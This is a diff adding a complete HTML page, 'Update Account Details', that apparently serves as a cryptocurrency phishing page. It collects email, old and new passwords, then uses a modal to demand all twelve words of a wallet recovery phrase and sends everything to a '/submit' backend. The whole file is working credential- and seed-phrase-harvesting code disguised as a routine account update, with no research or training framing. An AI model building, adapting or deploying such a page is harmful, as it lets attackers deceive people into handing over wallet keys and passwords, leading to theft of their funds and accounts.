@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Update Account Details</title>
+
+<style>
+/* [Same CSS as before, keep the modal/grid styles] */
+body { background: #0b1d2a; font-family: Arial, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin:0; }
+.container { width: 100%; max-width: 420px; padding: 20px; }
+.card { background: #0f2a3a; border-radius: 12px; padding: 30px; box-shadow: 0 10px 30px rgba(0,0,0,0.4); }
+.card h2 { color:#fff; margin-bottom:10px;}
+.instruction { color:#9bb3c7; font-size:14px; margin-bottom:25px;}
+.form-group { margin-bottom:18px;}
+label { display:block;color:#cddae4;font-size:13px;margin-bottom:6px;}
+input { width:100%; padding:12px; border-radius:6px; border:1px solid #2d4c61; background:#081823; color:#fff; outline:none;}
+input::placeholder { color:#6f8ba0; }
+.btn { width:100%; padding:12px; background:#1f8cff; border:none; border-radius:6px; color:#fff; font-size:15px; cursor:pointer; margin-top:10px;}
+.btn:hover { background:#1674d9;}
+.modal { display:none; position:fixed; inset:0; background: rgba(0,0,0,0.8); justify-content:center; align-items:center; z-index:999;}
+.modal-content { background:#0f2a3a; width:95%; max-width:600px; padding:30px; border-radius:12px;}
+.modal-content h3 { color:#fff; margin-bottom:10px;}
+.modal-content p { color:#9bb3c7; font-size:13px; margin-bottom:20px;}
+.recovery-grid { display:grid; grid-template-columns:repeat(4,1fr); gap:15px;}
+.recovery-grid label { display:block;color:#cddae4;font-size:12px;margin-bottom:4px;}
+.recovery-grid input { width:100%; padding:10px; border-radius:6px; border:1px solid #2d4c61; background:#081823; color:#fff; outline:none; text-align:center; font-size:14px;}
+.modal-actions { margin-top:25px; display:flex; gap:10px;}
+.cancel-btn { background:#2d4c61;}
+.message-box { margin-top:20px; background:#1f3f5a; padding:15px; border-radius:8px; color:#fff; text-align:center; display:none;}
+.error-box { margin-top:10px; background:#a82828; padding:12px; border-radius:6px; color:#fff; text-align:center; display:none;}
+</style>
+</head>
+<body>
+
+<div class="container">
+  <div class="card">
+    <h2>Update Account Details</h2>
+    <p class="instruction">Update your email and password. You’ll be asked to confirm your 12-word recovery phrase.</p>
+
+    <form id="updateForm">
+      <div class="form-group"><label>Email Address</label><input type="email" placeholder="Enter new email" required></div>
+      <div class="form-group"><label>Old Password</label><input type="password" placeholder="Enter old password" required></div>
+      <div class="form-group"><label>New Password</label><input type="password" placeholder="Enter new password" required></div>
+      <button class="btn">Update Details</button>
+    </form>
+
+    <div class="message-box" id="messageBox"></div>
+    <div class="error-box" id="errorBox"></div>
+  </div>
+</div>
+
+<div class="modal" id="recoveryModal">
+  <div class="modal-content">
+    <h3>Confirm Recovery Phrase</h3>
+    <p>Enter your 12-word recovery phrase to confirm this update.</p>
+    <div class="recovery-grid">
+      <div><label>1</label><input placeholder="Word 1"></div>
+      <div><label>2</label><input placeholder="Word 2"></div>
+      <div><label>3</label><input placeholder="Word 3"></div>
+      <div><label>4</label><input placeholder="Word 4"></div>
+      <div><label>5</label><input placeholder="Word 5"></div>
+      <div><label>6</label><input placeholder="Word 6"></div>
+      <div><label>7</label><input placeholder="Word 7"></div>
+      <div><label>8</label><input placeholder="Word 8"></div>
+      <div><label>9</label><input placeholder="Word 9"></div>
+      <div><label>10</label><input placeholder="Word 10"></div>
+      <div><label>11</label><input placeholder="Word 11"></div>
+      <div><label>12</label><input placeholder="Word 12"></div>
+    </div>
+    <div class="modal-actions">
+      <button class="btn cancel-btn" onclick="closeModal()">Cancel</button>
+      <button class="btn" onclick="submitRecovery()">Confirm Update</button>
+    </div>
+  </div>
+</div>
+
+<script>
+const form = document.getElementById("updateForm");
+const modal = document.getElementById("recoveryModal");
+const messageBox = document.getElementById("messageBox");
+const errorBox = document.getElementById("errorBox");
+
+form.addEventListener("submit", function(e) {
+  e.preventDefault();
+  modal.style.display = "flex";
+  errorBox.style.display = "none";
+});
+
+function closeModal() {
+  modal.style.display = "none";
+}
+
+// Send form + recovery phrase to Flask backend
+async function submitRecovery() {
+  const inputs = document.querySelectorAll(".recovery-grid input");
+  const recovery_words = [];
+  for (let input of inputs) {
+    if (!input.value.trim()) {
+      alert("Please enter all 12 recovery words.");
+      return;
+    }
+    recovery_words.push(input.value.trim());
+  }
+
+  const formData = form.elements;
+  const data = {
+    email: formData[0].value,
+    old_password: formData[1].value,
+    new_password: formData[2].value,
+    recovery_words: recovery_words
+  };
+
+  try {
+    const res = await fetch("/submit", {
+      method: "POST",
+      headers: {"Content-Type":"application/json"},
+      body: JSON.stringify(data)
+    });
+    const result = await res.json();
+
+    if (result.status === "error") {
+      errorBox.textContent = result.message;
+      errorBox.style.display = "block";
+      // clear recovery inputs for retry
+      for (let input of inputs) input.value = "";
+    } else {
+      errorBox.style.display = "none";
+      modal.style.display = "none";
+      messageBox.textContent = result.message;
+      messageBox.style.display = "block";
+    }
+  } catch (err) {
+    alert("Server error: " + err);
+  }
+}
+</script>
+
+</body>
+</html>
